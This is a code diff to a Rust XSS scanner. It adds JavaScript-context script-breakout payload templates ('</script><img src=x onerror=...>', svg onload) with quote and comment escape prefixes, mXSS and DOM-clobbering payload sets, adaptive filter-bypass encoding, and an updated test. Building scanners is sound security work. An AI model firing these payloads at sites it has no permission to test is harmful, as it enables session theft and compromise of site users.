@@ -37,6 +37,7 @@ fn get_fallback_reflection_payloads(
                 .map(|s| s.to_string()),
         );
         base_payloads.extend(crate::payload::get_dynamic_xss_html_payloads());
+        base_payloads.extend(crate::payload::get_mxss_payloads());
         if let Some(path) = &args.custom_payload {
             base_payloads.extend(crate::scanning::xss_common::load_custom_payloads(path)?);
         }
@@ -48,15 +49,58 @@ fn get_fallback_reflection_payloads(
     Ok(payloads)
 }
 
+fn get_js_breakout_payloads() -> Vec<String> {
+    let class_marker = crate::scanning::markers::class_marker();
+    let id_marker = crate::scanning::markers::id_marker();
+
+    let base_templates = [
+        format!("</script><img src=x onerror={{JS}} class={}>", class_marker),
+        format!("</script><svg onload={{JS}} class={}>", class_marker),
+        format!("</script><img src=x onerror={{JS}} id={}>", id_marker),
+    ];
+
+    let breakout_prefixes: &[&str] = &["", "';", "\";", "*/"];
+
+    let mut payloads = Vec::new();
+    for js in crate::payload::XSS_JAVASCRIPT_PAYLOADS_SMALL.iter() {
+        for tmpl in &base_templates {
+            for &prefix in breakout_prefixes {
+                let payload = format!("{}{}", prefix, tmpl.replace("{JS}", js));
+                payloads.push(payload);
+            }
+        }
+    }
+    payloads
+}
+
 fn get_dom_payloads(
     param: &Param,
     args: &ScanArgs,
 ) -> Result<Vec<String>, Box<dyn std::error::Error>> {
     match &param.injection_context {
-        // JS context: reflection-only
-        Some(crate::parameter_analysis::InjectionContext::Javascript(_)) => Ok(vec![]),
+        // JS context: script breakout payloads with markers for DOM verification
+        Some(crate::parameter_analysis::InjectionContext::Javascript(_)) => {
+            let base_payloads = get_js_breakout_payloads();
+            let out = crate::encoding::apply_encoders_to_payloads(&base_payloads, &args.encoders);
+            Ok(out)
+        }
         // Known non-JS contexts: use locally generated payloads only (exclude remote) to avoid large cross-product
         Some(ctx) => {
+            // If param has analysis data, use adaptive encoding for better bypass
+            if param.invalid_specials.is_some() || param.valid_specials.is_some() {
+                let invalid = param
+                    .invalid_specials
+                    .as_deref()
+                    .unwrap_or_default();
+                let valid = param
+                    .valid_specials
+                    .as_deref()
+                    .unwrap_or_default();
+                let payloads = crate::scanning::xss_common::generate_adaptive_payloads(
+                    ctx, invalid, valid,
+                );
+                return Ok(payloads);
+            }
             // Use locally generated payloads only (no remote) to avoid large cross-product in DOM verification
             let base_payloads = crate::scanning::xss_common::generate_dynamic_payloads(ctx);
             // Expand with shared encoder policy helper
@@ -79,6 +123,8 @@ fn get_dom_payloads(
             } else {
                 base_payloads.extend(crate::payload::get_dynamic_xss_html_payloads());
                 base_payloads.extend(crate::payload::get_dynamic_xss_attribute_payloads());
+                base_payloads.extend(crate::payload::get_mxss_payloads());
+                base_payloads.extend(crate::payload::get_dom_clobbering_payloads());
                 if let Some(path) = &args.custom_payload {
                     base_payloads.extend(
                         crate::scanning::xss_common::load_custom_payloads(path)
@@ -755,7 +801,7 @@ mod tests {
     }
 
     #[test]
-    fn test_get_dom_payloads_javascript_context_returns_empty() {
+    fn test_get_dom_payloads_javascript_context_returns_breakout_payloads() {
         let param = Param {
             name: "q".to_string(),
             value: "seed".to_string(),
@@ -766,7 +812,14 @@ mod tests {
         };
         let args = default_scan_args();
         let payloads = get_dom_payloads(&param, &args).expect("dom payload generation");
-        assert!(payloads.is_empty());
+        assert!(
+            !payloads.is_empty(),
+            "JS context should now produce script breakout payloads"
+        );
+        assert!(
+            payloads.iter().any(|p| p.contains("</script>")),
+            "should contain script breakout"
+        );
     }
 
     #[test]
